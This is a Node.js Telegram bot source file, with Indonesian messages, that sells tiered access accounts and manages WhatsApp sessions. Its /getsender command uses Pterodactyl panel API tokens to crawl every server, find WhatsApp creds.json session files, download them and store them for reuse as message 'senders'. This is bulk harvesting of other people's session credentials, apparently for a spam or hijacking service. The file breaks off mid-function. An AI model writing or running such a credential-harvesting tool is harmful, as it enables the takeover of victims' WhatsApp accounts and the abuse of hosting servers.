const TelegramBot = require("node-telegram-bot-api");
const fs = require('fs');
const axios = require('axios');
const { logger } = require('../utils/logger');
const { TOKEN, OWNER_ID, ID_GROUP, ID_GROUP_UTAMA, ROLE_GROUP_MAP, ALLOWED_GROUPS } = require('../config/telegram');
const { loadDatabase, saveDatabase } = require('./databaseService');
const path = require('path');
const { execSync } = require('child_process');
const { disconnectAllActiveConnections, startUserSessions } = require('./whatsappService');

const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');

const bot = new TelegramBot(TOKEN, { polling: true });
const userRoleCache = new Map();

const ROLE_HIERARCHY = {
  'founder': ['member', 'vip', 'reseller', 'admin', 'moderator', 'high admin', 'owner'],
  'owner': ['member', 'vip', 'reseller'],
  'high admin': ['member', 'vip', 'reseller', 'owner'],
  'moderator': ['member', 'vip', 'reseller', 'owner'],
  'admin': ['member', 'vip', 'reseller', 'owner'],
  'reseller': ['member', 'vip']
};

const UNLIMITED_ROLES = ['reseller', 'owner', 'high admin', 'moderator', 'founder'];
const ALLOWED_CUSTOM_ROLES = ['member', 'vip', 'reseller', 'admin', 'moderator', 'high admin', 'owner', 'founder'];

const REQUIRED_CHANNELS = [
  { username: '@kiuchan11', id: null }
];

const GETSENDER_ALLOWED_ROLES = ['vip', 'reseller', 'admin', 'high admin', 'moderator', 'owner', 'founder'];
const VIP_SESSIONS_PATH = './sessions/vip/';
const MEMBER_SESSIONS_PATH = './sessions/member/';
const RESELLER_SESSIONS_PATH = './sessions/reseller/';
const VIP_FOLDER_ROOT = './vip';

function getSessionPathByRole(role) {
  switch(role.toLowerCase()) {
    case 'vip': return VIP_SESSIONS_PATH;
    case 'reseller': return RESELLER_SESSIONS_PATH;
    default: return MEMBER_SESSIONS_PATH;
  }
}

function extractNumbersFromCreds(credsJson) {
  let numbers = [];
  if (Array.isArray(credsJson)) {
    numbers = credsJson.filter(item => 
      typeof item === 'string' || typeof item === 'number'
    ).map(item => String(item));
  }
  else if (typeof credsJson === 'object' && credsJson !== null) {
    if (credsJson.me && credsJson.me.id) {
      const match = credsJson.me.id.match(/(\d+):/);
      if (match) numbers.push(match[1]);
    }
    if (credsJson.phoneNumber) numbers.push(String(credsJson.phoneNumber));
    if (credsJson.authPhone) numbers.push(String(credsJson.authPhone));
    if (credsJson.phoneNumbers && Array.isArray(credsJson.phoneNumbers)) {
      numbers.push(...credsJson.phoneNumbers.map(n => String(n)));
    }
    if (credsJson.phones && Array.isArray(credsJson.phones)) {
      numbers.push(...credsJson.phones.map(n => String(n)));
    }
    if (credsJson.contacts && Array.isArray(credsJson.contacts)) {
      numbers.push(...credsJson.contacts.map(n => String(n)));
    }
    if (numbers.length === 0) {
      for (const key of Object.keys(credsJson)) {
        if (Array.isArray(credsJson[key]) && credsJson[key].length > 0) {
          const firstItem = credsJson[key][0];
          if (typeof firstItem === 'string' || typeof firstItem === 'number') {
            const possibleNumbers = credsJson[key].filter(item => 
              String(item).replace(/[^0-9]/g, '').length >= 10
            );
            if (possibleNumbers.length > 0) {
              numbers.push(...possibleNumbers.map(n => String(n)));
              break;
            }
          }
        }
      }
    }
  }
  numbers = [...new Set(numbers)];
  numbers = numbers.filter(n => n && String(n).replace(/[^0-9]/g, '').length >= 8);
  numbers = numbers.map(n => n.toString().replace(/[^0-9]/g, ''));
  return numbers;
}

function formatTime(date) {
  if (!date) return 'Tidak diketahui';
  const d = new Date(date);
  const now = new Date();
  const diff = Math.floor((now - d) / 1000);
  if (diff < 60) return `${diff} detik lalu`;
  if (diff < 3600) return `${Math.floor(diff / 60)} menit lalu`;
  if (diff < 86400) return `${Math.floor(diff / 3600)} jam lalu`;
  return `${Math.floor(diff / 86400)} hari lalu`;
}

async function getChannelId(username) {
  try {
    const chat = await bot.getChat(username);
    return chat.id;
  } catch (error) {
    console.error(`Gagal mendapatkan ID channel ${username}:`, error.message);
    return null;
  }
}

async function initChannelIds() {
  for (const channel of REQUIRED_CHANNELS) {
    if (!channel.id) {
      channel.id = await getChannelId(channel.username);
    }
  }
}

async function isUserFollowingChannels(userId) {
  for (const channel of REQUIRED_CHANNELS) {
    try {
      const chatMember = await bot.getChatMember(channel.id || channel.username, userId);
      const status = chatMember.status;
      if (!['member', 'administrator', 'creator'].includes(status)) {
        return { following: false, channel: channel.username };
      }
    } catch (error) {
      console.error(`Error cek channel ${channel.username}:`, error.message);
      return { following: false, channel: channel.username, error: true };
    }
  }
  return { following: true };
}

// ==================== FUNGSI UTAMA GET USER ROLE ====================
async function getUserRoleFromGroup(userId) {
  try {
    let highestRole = 'nonmember';
    let foundGroup = null;

    const rolePriority = {
      'founder': 8,
      'owner': 7,
      'high admin': 6,
      'moderator': 5,
      'admin': 4,
      'reseller': 3,
      'vip': 2,
      'member': 1
    };

    // Jika ALLOWED_GROUPS kosong, gunakan ID_GROUP dan ID_GROUP_UTAMA saja
    let groupsToCheck = ALLOWED_GROUPS;
    if (!groupsToCheck || groupsToCheck.length === 0) {
      groupsToCheck = [...ID_GROUP, ...ID_GROUP_UTAMA];
    }

    for (const groupId of groupsToCheck) {
      try {
        const chatMember = await bot.getChatMember(groupId, userId);
        const status = chatMember.status;

        const isMember = ['member', 'administrator', 'creator'].includes(status);
        if (!isMember) continue;

        let mappedRole = 'member';
        // Cek apakah grup ini punya role khusus di ROLE_GROUP_MAP
        if (ROLE_GROUP_MAP && ROLE_GROUP_MAP[groupId.toString()]) {
          mappedRole = ROLE_GROUP_MAP[groupId.toString()];
        }

        const currentPriority = rolePriority[mappedRole] || 0;
        const highestPriority = rolePriority[highestRole] || 0;

        if (currentPriority > highestPriority) {
          highestRole = mappedRole;
          foundGroup = groupId;
        }
      } catch (error) {
        // Gagal ambil data dari grup (misal bot tidak admin, atau grup tidak dikenal)
        console.error(`Gagal cek member di grup ${groupId}: ${error.message}`);
        continue;
      }
    }

    const isAdmin = ['admin', 'high admin', 'moderator', 'owner', 'founder'].includes(highestRole);
    const isMember = highestRole !== 'nonmember';

    if (!isMember) {
      console.log(`User ${userId} tidak terdeteksi di grup manapun. Role: ${highestRole}`);
    } else {
      console.log(`User ${userId} mendapat role ${highestRole} dari grup ${foundGroup}`);
    }

    return {
      role: highestRole,
      isAdmin: isAdmin,
      isMember: isMember,
      groupId: foundGroup
    };
  } catch (error) {
    console.error('Error getting user role:', error);
    return { role: 'member', isAdmin: false, isMember: false, groupId: null };
  }
}

// ==================== NOTIFIKASI PEMBUATAN AKUN ====================
async function sendAccountCreationNotification(msg, username) {
  try {
    const telegramId = msg.from.id;
    const telegramUsername = msg.from.username ? '@' + msg.from.username : 'Tidak ada username';
    const notifText = `⚠️ USER MEMBUAT AKUN ⚠️\n\nID : ${telegramId}\nUSERNAME : ${telegramUsername}\nUSER AKUN : ${username}\n\nDESKRIPSI : TUAN @RyyKiosy ADA YG MEMBUAT AKUN TANPA IZIN DAN ${telegramUsername} KAMU HARUS SS BUKTI TRANSFER DULU KE JURAGAN LC`;
    const allGroups = [...new Set([...ID_GROUP, ...ID_GROUP_UTAMA, ...Object.keys(ROLE_GROUP_MAP || {}).map(Number)])];
    for (const groupId of allGroups) {
      await bot.sendMessage(groupId, notifText);
    }
  } catch (error) {
    console.error('Gagal mengirim notifikasi akun:', error.message);
  }
}

function canCreateAccount(userId, role) {
  const db = loadDatabase();
  const userAccounts = db.filter(acc => acc.createdBy === userId);
  const accountCount = userAccounts.length;
  if (UNLIMITED_ROLES.includes(role)) {
    return { allowed: true, remaining: 'Unlimited' };
  }
  if (role === 'member' || role === 'vip') {
    if (accountCount >= 1) {
      return { allowed: false, remaining: 0, maxAccounts: 1 };
    }
    return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
  }
  if (accountCount >= 1) {
    return { allowed: false, remaining: 0, maxAccounts: 1 };
  }
  return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
}

async function checkFollowRequirement(userId, chatId, actionName = 'menggunakan bot') {
  const followStatus = await isUserFollowingChannels(userId);
  if (!followStatus.following) {
    const channelList = REQUIRED_CHANNELS.map(c => c.username).join(' dan ');
    bot.sendMessage(chatId, 
      `❌ AKSES DITOLAK!\n\n` +
      `Anda harus follow channel berikut terlebih dahulu untuk ${actionName}:\n\n` +
      `📢 ${REQUIRED_CHANNELS.map(c => c.username).join('\n📢 ')}\n\n` +
      `✅ Cara follow:\n` +
      `1. Klik link channel di atas\n` +
      `2. Tekan tombol FOLLOW/JOIN\n` +
      `3. Kembali ke sini dan ketik /start\n\n` +
      `Setelah follow, bot akan otomatis mendeteksi dan memberikan akses.`
    );
    return false;
  }
  return true;
}

// ==================== COMMAND BACKUPDB ====================
bot.onText(/^\/backupdb$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    const userData = await getUserRoleFromGroup(userId);
    if (!['founder'].includes(userData.role)) {
      return bot.sendMessage(chatId, '❌ Anda tidak memiliki akses untuk backup database.');
    }
    const backupDir = path.join(__dirname, '../../backups');
    if (!fs.existsSync(backupDir)) {
      fs.mkdirSync(backupDir, { recursive: true });
    }
    const timestamp = new Date().toISOString().replace(/[.:]/g, '-');
    const zipPath = path.join(backupDir, `database-backup-${timestamp}.zip`);
    const dbPath = path.join(__dirname, '../../data/database.json');
    const keyListPath = path.join(__dirname, '../../data/keyList.json');
    const vpsPath = path.join(__dirname, '../../data/vps.json');
    execSync(`zip -j "${zipPath}" "${dbPath}" "${keyListPath}" "${vpsPath}"`, { stdio: 'ignore' });
    if (!fs.existsSync(zipPath)) {
      return bot.sendMessage(chatId, '❌ Gagal membuat file backup database.');
    }
    await bot.sendDocument(chatId, zipPath, { caption: `✅ Backup database berhasil dibuat\n📦 File: ${zipPath.split('/').pop()}` });
  } catch (error) {
    logger.error(`Backup database error: ${error.message}`);
    bot.sendMessage(chatId, `❌ Error backup database: ${error.message}`);
  }
});

// ==================== COMMAND GETSENDER ====================
async function findCredsInDirectory(domain, apiToken, serverId, currentPath = '/') {
  const url = `https://${domain}/api/client/servers/${serverId}/files/list?directory=${encodeURIComponent(currentPath)}`;
  try {
    const response = await axios({ method: 'GET', url, headers: { 'Authorization': `Bearer ${apiToken}` }, timeout: 30000 });
    if (response.data && Array.isArray(response.data)) {
      for (const item of response.data) {
        if (item.name === 'creds.json' && !item.is_file) return { found: true, path: `${currentPath}/${item.name}` };
        if (item.is_file && item.name === 'creds.json') return { found: true, path: `${currentPath}/${item.name}` };
        if (!item.is_file && item.name !== '.' && item.name !== '..') {
          const subPath = currentPath === '/' ? `/${item.name}` : `${currentPath}/${item.name}`;
          const result = await findCredsInDirectory(domain, apiToken, serverId, subPath);
          if (result.found) return result;
        }
      }
    }
    return { found: false };
  } catch (error) {
    return { found: false, error: error.message };
  }
}

async function downloadFile(domain, apiToken, serverId, filePath) {
  const url = `https://${domain}/api/client/servers/${serverId}/files/contents?file=${encodeURIComponent(filePath)}`;
  try {
    const response = await axios({ method: 'GET', url, headers: { 'Authorization': `Bearer ${apiToken}` }, responseType: 'arraybuffer', timeout: 60000 });
    return { success: true, data: response.data };
  } catch (error) {
    return { success: false, error: error.response?.data || error.message };
  }
}

async function saveCredsToFolder(credsData, serverId, serverName, role) {
  const fsPromises = require('fs').promises;
  const path = require('path');
  const sanitizedName = serverName.replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 50);
  const folderName = `${serverId}_${sanitizedName}`;
  const sessionPath = getSessionPathByRole(role);
  const targetFolder = path.join(sessionPath, folderName);
  const credsPath = path.join(targetFolder, 'creds.json');
  try {
    await fsPromises.mkdir(targetFolder, { recursive: true });
    let credsJson;
    if (Buffer.isBuffer(credsData)) credsJson = JSON.parse(credsData.toString('utf8'));
    else if (typeof credsData === 'string') credsJson = JSON.parse(credsData);
    else credsJson = credsData;
    await fsPromises.writeFile(credsPath, JSON.stringify(credsJson, null, 2), 'utf8');
    return { success: true, path: credsPath, folder: folderName };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

bot.onText(/^\/getsender(?:\s+(.+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const input = match ? match[1] : null;
  if (msg.chat.type !== 'private') return bot.sendMessage(chatId, "❌ GOBLOK! Pake command ini di private chat!");
  const canAccess = await checkFollowRequirement(userId, chatId, 'ngambil sender');
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(chatId, "❌ KONTOL! Lu bukan anggota grup, gabisa make fitur ini!");
  if (!GETSENDER_ALLOWED_ROLES.includes(role.toLowerCase())) return bot.sendMessage(chatId, `❌ ASU! Fitur /getsender cuma buat:\n- VIP\n- Reseller\n- Admin\n- High Admin\n- Moderator\n- Owner\n- Founder\n\nROLE LU: ${role.toUpperCase()}, NGAK BISA!`);
  if (!input) return bot.sendMessage(chatId, "🔥 CARTA KONTOL - /GETSENDER 🔥\n\nFormat: /getsender domain|plta|pltc\n\nContoh:\n/getsender panel.goblok.com|ptla_WoiNgentot|ptlc_YhaKontol\n\n📌 Penjelasan:\n- domain: Domain panel Pterodactyl (tanpa https://)\n- plta: Personal Access Token (Client API)\n- pltc: Client Token (bisa pake PLTA juga)\n\n⚠️ Sistem bakal SCAN SEMUA server dan ambil SEMUA creds.json!\n📁 Hasil disimpan di: sessions/[role]/[serverId_namaServer]/creds.json");
  const parts = input.split('|');
  if (parts.length !== 3) return bot.sendMessage(chatId, "❌ FORMAT SALAH!\n\nHarus: /getsender domain|plta|pltc\n\nContoh bener: /getsender panel.anjing.com|ptla_xxxx|ptlc_yyyy");
  const [domain, plta, pltc] = parts.map(p => p.trim());
  if (!domain || !plta || !pltc) return bot.sendMessage(chatId, "❌ SEMUA FIELD HARUS DIISI! Jangan ada yang kosong.");
  await bot.sendMessage(chatId, `🔄 PROSES AUTO SCAN CREDS...\n\n📡 Domain: ${domain}\n🎭 Role lu: ${role.toUpperCase()}\n\n⏳ Sedang mengambil daftar server dan mencari creds.json...\n🚀 INI BAKALAN LAMA KALO BANYAK SERVERNYA, SABAR!`);
  try {
    const serversUrl = `https://${domain}/api/client`;
    const serversResp = await axios({ method: 'GET', url: serversUrl, headers: { 'Authorization': `Bearer ${pltc}` }, timeout: 30000 });
    if (!serversResp.data || !serversResp.data.data) throw new Error('Gagal mengambil daftar server');
    const servers = serversResp.data.data;
    if (servers.length === 0) return bot.sendMessage(chatId, "❌ TIDAK ADA SERVER DI AKUN PTERODACTYL INI!");
    let statusMessage = `🔍 DITEMUKAN ${servers.length} SERVER\n\nMulai scan masing-masing server...\n━━━━━━━━━━━━━━━━━━━━\n\n`;
    await bot.sendMessage(chatId, statusMessage);
    let successCount = 0, failCount = 0;
    const results = [];
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const serverId = server.attributes.identifier;
      const serverName = server.attributes.name;
      if (i % 3 === 0 && i > 0) await bot.sendMessage(chatId, `🔄 Progress: ${i}/${servers.length} server discan...`);
      const credsLocation = await findCredsInDirectory(domain, pltc, serverId, '/');
      if (credsLocation.found) {
        const downloadResult = await downloadFile(domain, pltc, serverId, credsLocation.path);
        if (downloadResult.success) {
          const saveResult = await saveCredsToFolder(downloadResult.data, serverId, serverName, role);
          if (saveResult.success) {
            successCount++;
            results.push({ status: '✅', serverName, serverId, folder: saveResult.folder, path: credsLocation.path });
          } else {
            failCount++;
            results.push({ status: '❌', serverName, error: `Gagal simpan: ${saveResult.error}` });
          }
        } else {
          failCount++;
          results.push({ status: '❌', serverName, error: `Gagal download: ${downloadResult.error}` });
        }
      } else {
        results.push({ status: '⚠️', serverName, error: 'creds.json tidak ditemukan' });
      }
    }
    let finalMessage = `✅ HASIL AUTO SCAN CREDS!\n\n📡 Domain: ${domain}\n📊 Total server: ${servers.length}\n✅ Berhasil: ${successCount}\n❌ Gagal: ${failCount}\n📁 Disimpan di: ${getSessionPathByRole(role)}\n\n📋 DETAIL:\n━━━━━━━━━━━━━━━━━━━━\n`;
    let batchMessage = finalMessage;
    for (const res of results) {
      if (res.status === '✅') batchMessage += `${res.status} ${res.serverName}\n   └ Folder: ${res.folder}\n   └ Path asal: ${res.path}\n\n`;
      else if (res.status === '❌') batchMessage += `${res.status} ${res.serverName}: ${res.error}\n\n`;
      else batchMessage += `${res.status} ${res.serverName}: ${res.error}\n\n`;
      if (batchMessage.length > 3500) {
        const fileName = `getsender_${Date.now()}.txt`;
        fs.writeFileSync(fileName, batchMessage, 'utf8');
        await bot.sendDocument(chatId, fileName, { caption: `📊 HASIL GETSENDER\nDomain: ${domain}\nSukses: ${successCount}/${servers.length}` });
        fs.unlinkSync(fileName);
        batchMessage = "";
      }
    }
    if (batchMessage.length > 0) await bot.sendMessage(chatId, batchMessage);
    if (successCount > 0) await bot.sendMessage(chatId, `🔥 SUKSES! ${successCount} creds berhasil disimpan.\n📁 Lokasi: ${getSessionPathByRole(role)}\n\n💾 Sekarang lu bisa pake creds itu buat jalanin WhatsApp bot lu!`);
  } catch (error) {
    console.error('Error di /getsender:', error);
    await bot.sendMessage(chatId, `❌ ERROR GOBLOK!\n\nError: ${error.message}\n\nCek lagi:\n- Domain panel bener? (jangan pake https://)\n- Token API valid?\n- Server Pterodactyl nyala?`);
  }
});

// ==================== HELPER: PARSE & VALIDATE INPUT ====================
function parseAddInput(input, commandName) {
  const parts = input.split(',');
  if (parts.length !== 3) return { error: `❌ Format salah!\n\nGunakan:\n/${commandName} username,password,durasi\n\nContoh:\n/${commandName} john,123456,30` };
  const username = parts[0].trim();
  const password = parts[1].trim();
  const duration = parseInt(parts[2].trim());
  if (!username || username.length < 3) return { error: "❌ Username minimal 3 karakter!" };
  if (!password || password.length < 3) return { error: "❌ Password minimal 3 karakter!" };
  if (isNaN(duration) || duration <= 0) return { error: "❌ Durasi harus angka positif!" };
  return { username, password, duration };
}

function buildExpiredDate(duration) {
  const expired = new Date();
  expired.setDate(expired.getDate() + duration);
  return expired.toISOString().split("T")[0];
}

function buildSuccessMsg(username, password, roleLabel, duration, expiredDate, creatorRole, totalAkun) {
  return `✅ AKUN ${roleLabel.toUpperCase()} BERHASIL DIBUAT!\n\n👤 Username: ${username}\n🔐 Password: ${password}\n🎭 Role: ${roleLabel.toUpperCase()}\n⏳ Durasi: ${duration} hari\n📅 Expired: ${expiredDate}\n\n👑 Dibuat oleh: ${creatorRole.toUpperCase()}\n📊 Total akun kamu: ${totalAkun}`;
}

async function handleAddCommand(msg, match, targetRole, allowedCreatorRoles, commandName) {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(chatId, "❌ Gunakan di private chat!");
  const canAccess = await checkFollowRequirement(userId, chatId, `membuat akun ${targetRole}`);
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(chatId, "❌ Kamu bukan member grup!");
  if (!allowedCreatorRoles.includes(role)) {
    return bot.sendMessage(chatId, `❌ Akses ditolak!\n\nCommand /${commandName} hanya bisa digunakan oleh:\n${allowedCreatorRoles.map(r => `- ${r.toUpperCase()}`).join('\n')}\n\nRole kamu: ${role.toUpperCase()}`);
  }
  const parsed = parseAddInput(match[1], commandName);
  if (parsed.error) return bot.sendMessage(chatId, parsed.error);
  const { username, password, duration } = parsed;
  const db = loadDatabase();
  if (db.find(u => u.username === username)) return bot.sendMessage(chatId, "❌ Username sudah ada! Coba username lain.");
  const expiredDate = buildExpiredDate(duration);
  db.push({
    username,
    password,
    role: targetRole,
    createdBy: userId,
    creatorRole: role,
    creatorName: msg.from.first_name,
    createdAt: new Date().toISOString(),
    expiredDate
  });
  saveDatabase(db);
  const totalAkun = db.filter(acc => acc.createdBy === userId).length;
  bot.sendMessage(chatId, buildSuccessMsg(username, password, targetRole, duration, expiredDate, role, totalAkun));
}

// ==================== COMMAND ADDAKUN (buat akun member) ====================
bot.onText(/^\/addakun (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(chatId, "❌ Gunakan di private chat!");
  const canAccess = await checkFollowRequirement(userId, chatId, 'membuat akun');
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(chatId, "❌ Kamu bukan member grup!");
  if (!['member', 'vip', 'reseller', 'owner', 'admin', 'moderator', 'high admin', 'founder'].includes(role)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk membuat akun!");
  }
  const parsed = parseAddInput(match[1], 'addakun');
  if (parsed.error) return bot.sendMessage(chatId, parsed.error);
  const { username, password, duration } = parsed;
  const db = loadDatabase();
  if (db.find(u => u.username === username)) return bot.sendMessage(chatId, "❌ Username sudah ada! Coba username lain.");
  // Member & VIP hanya bisa buat 1 akun
  if (role === 'member' || role === 'vip') {
    const myAccounts = db.filter(acc => acc.createdBy === userId);
    if (myAccounts.length >= 1) return bot.sendMessage(chatId, `❌ Role ${role.toUpperCase()} hanya bisa membuat 1 akun!\n\nHapus akun lama dulu kalau mau bikin baru.`);
  }
  const expiredDate = buildExpiredDate(duration);
  db.push({
    username, password, role: 'member',
    createdBy: userId, creatorRole: role,
    creatorName: msg.from.first_name,
    createdAt: new Date().toISOString(), expiredDate
  });
  saveDatabase(db);
  const totalAkun = db.filter(acc => acc.createdBy === userId).length;
  bot.sendMessage(chatId, buildSuccessMsg(username, password, 'member', duration, expiredDate, role, totalAkun));
});

// ==================== COMMAND ADDVIP ====================
// Bisa digunakan oleh: founder, moderator, high admin, admin, owner, reseller
bot.onText(/^\/addvip (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'vip',
    ['founder', 'moderator', 'high admin', 'admin', 'owner', 'reseller'],
    'addvip'
  );
});

// ==================== COMMAND ADDSELLER (reseller) ====================
// Bisa digunakan oleh: founder, moderator, high admin, admin, owner
bot.onText(/^\/addseller (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'reseller',
    ['founder', 'moderator', 'high admin', 'admin', 'owner'],
    'addseller'
  );
});

// ==================== COMMAND ADDOWNER ====================
// Bisa digunakan oleh: founder, moderator, high admin, admin
bot.onText(/^\/addowner (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'owner',
    ['founder', 'moderator', 'high admin', 'admin'],
    'addowner'
  );
});

// Alias /addown juga support (tampil di menu moderator/high admin/admin)
bot.onText(/^\/addown (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'owner',
    ['founder', 'moderator', 'high admin', 'admin'],
    'addown'
  );
});

// ==================== COMMAND ADDADMIN ====================
// Bisa digunakan oleh: founder, moderator, high admin
bot.onText(/^\/addadmin (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'admin',
    ['founder', 'moderator', 'high admin'],
    'addadmin'
  );
});

// ==================== COMMAND ADDMOD (moderator) ====================
// Bisa digunakan oleh: founder
bot.onText(/^\/addmod (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'moderator',
    ['founder'],
    'addmod'
  );
});

// ==================== COMMAND ADDHA (high admin) ====================
// Bisa digunakan oleh: founder, moderator
bot.onText(/^\/addha (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'high admin',
    ['founder', 'moderator'],
    'addha'
  );
});

// ==================== COMMAND ADDFOUNDER ====================
// Hanya bisa digunakan oleh: founder
bot.onText(/^\/addfounder (.+)$/, async (msg, match) => {
  await handleAddCommand(msg, match, 'founder',
    ['founder'],
    'addfounder'
  );
});

// ==================== COMMAND START/MENU ====================
/*
bot.onText(/^\/?(start|menu)$/, async (msg) => {
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Silakan gunakan command ini di Private Chat dengan bot.");
  const userId = msg.from.id;
  const canAccess = await checkFollowRequirement(userId, userId, 'menggunakan bot');
  if (!canAccess) return;
  const { role, isAdmin, isMember } = await getUserRoleFromGroup(userId);
  userRoleCache.set(userId, { role, isAdmin, isMember, timestamp: Date.now() });
  if (!isMember) return bot.sendMessage(userId, "❌ Akses Ditolak!\n\nAnda harus menjadi anggota grup terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join ke grup kami terlebih dahulu.");
  const { allowed, remaining, maxAccounts } = canCreateAccount(userId, role);
  let menuText = `👋 Halo ${msg.from.first_name}!\n\n🎭 Role Anda: ${role.toUpperCase()}\n📊 Status: ${isAdmin ? 'Admin Grup' : 'Member Grup'}\n\n`;
  if (allowed) menuText += `✅ Sisa kuota: ${remaining} dari ${maxAccounts} akun\n\n`;
  else menuText += `❌ Kuota habis! Anda sudah mencapai batas maksimal ${maxAccounts} akun.\n\n`;
  menuText += "📋 COMMAND YANG TERSEDIA:\n";
  if (role === 'founder') menuText += "- /addseller id,user,pass,durasi\n- /addowner id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addmod id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addfounder id,user,pass,durasi\n- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n\n";
  else if (role === 'moderator') menuText += "- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'high admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'owner') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n\n";
  else if (role === 'reseller') menuText += "- /addakun id,user,pass,durasi\n\n";
  else if (role === 'vip') menuText += "- /addvip id,user,pass,durasi\n\n";
  else menuText += "- /addakun username,password,durasi\n\n";
  menuText += "📋 MENU UTAMA:\n- /start atau /menu - Menampilkan menu ini\n- /myakun - Lihat akun yang Anda buat\n- /cekkadaluarsa - Cek status expired akun";
  if (role === 'founder') menuText += "\n\n📋 MENU ADMIN:\n- /semuaakun - Lihat semua akun\n- /statakun - Statistik semua akun\n- /addsender - addsender\n- /backupdb - backup all database\n- /hapusakun username - Hapus akun";
  const photoUrl = "https://files.catbox.moe/v9pf3o.jpg";
  const keyboard = { reply_markup: { inline_keyboard: [[{ text: "📢 CHANNEL", url: "https://t.me/YakuzaXsilence", style: "success" }, { text: "👑 OWNER", url: "https://t.me/RyyKiosy", style: "success" }],
                                                      [{text: "👨🏻‍💻 DEVELOPER", url: "https://t.me/RriztXflow", style: "primary" }]]} };    
  bot.sendPhoto(userId, photoUrl, { caption: menuText, parse_mode: "Markdown", ...keyboard });
});

bot.onText(/^\/?(start|menu)$/, async (msg) => {
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Utilizza questo comando nella chat privata con il bot.");
  const userId = msg.from.id;
  const canAccess = await checkFollowRequirement(userId, userId, 'utilizzare il bot');
  if (!canAccess) return;
  const { role, isAdmin, isMember } = await getUserRoleFromGroup(userId);
  userRoleCache.set(userId, { role, isAdmin, isMember, timestamp: Date.now() });
  if (!isMember) return bot.sendMessage(userId, "❌ Accesso Negato!\n\nDevi prima essere membro del gruppo per utilizzare questo bot.\n\nUnisciti al nostro gruppo prima.");
  const { allowed, remaining, maxAccounts } = canCreateAccount(userId, role);
  
  let menuText = `( 🍁 )  YAKUZA -X- SILENCE ⚔️\n`;
  menuText += `─「 ⚔️ 」Olá, 👋 ${msg.from.first_name}!\n`;
  menuText += `Sono uno script Telegram per automatizzare gli ordini.\n\n`;
  menuText += `( 🍁 ) 「 Bot - Information ⚔️ 」\n`;
  menuText += `☇ Developer : RriztXflow.t.me\n`;
  menuText += `☇ Channel : YakuzaXsilence.t.me\n`;
  menuText += `☇ Testimoni : kiuchan12.t.me\n`;
  menuText += `☇ Framework : Telegraf - Javascript\n`;
  menuText += `☇ Type : Full stack\n`;
  menuText += `─「 📜 」Fitur ☇ YakuzaXsilence ─\n`;
  
  // Fitur berdasarkan role
  if (role === 'founder') {
    menuText += `𖥔 Create Account - Unlimited\n`;
    menuText += `𖥔 Manage All Roles\n`;
    menuText += `𖥔 View All Accounts\n`;
    menuText += `𖥔 Database Backup\n`;
    menuText += `𖥔 Add Sender\n`;
  } else if (role === 'moderator') {
    menuText += `𖥔 Create VIP & Premium Accounts\n`;
    menuText += `𖥔 Manage Reseller & HA\n`;
    menuText += `𖥔 View User Accounts\n`;
  } else if (role === 'high admin') {
    menuText += `𖥔 Create Premium Accounts\n`;
    menuText += `𖥔 Manage Reseller & Admin\n`;
    menuText += `𖥔 View User Accounts\n`;
  } else if (role === 'admin') {
    menuText += `𖥔 Create Basic Accounts\n`;
    menuText += `𖥔 Manage Reseller\n`;
    menuText += `𖥔 View User Accounts\n`;
  } else if (role === 'owner') {
    menuText += `𖥔 Create Basic Accounts\n`;
    menuText += `𖥔 Manage Reseller\n`;
  } else if (role === 'reseller') {
    menuText += `𖥔 Create Basic Accounts\n`;
  } else if (role === 'vip') {
    menuText += `𖥔 Create VIP Accounts\n`;
  } else {
    menuText += `𖥔 Create Basic Accounts\n`;
  }
  
  menuText += `─「 📜 」Note: Pakai Dengan Bijak\n`;
  menuText += `#- OmhcSilence - @RriztXflow¡\n\n`;
  
  // Status & Kuota
  menuText += `📊 Status: ${isAdmin ? 'Admin Grup' : 'Member Grup'}\n`;
  menuText += `🎭 Role: ${role.toUpperCase()}\n`;
  if (allowed) menuText += `✅ Sisa kuota: ${remaining} dari ${maxAccounts} akun\n\n`;
  else menuText += `❌ Kuota habis! Anda sudah mencapai batas maksimal ${maxAccounts} akun.\n\n`;
  
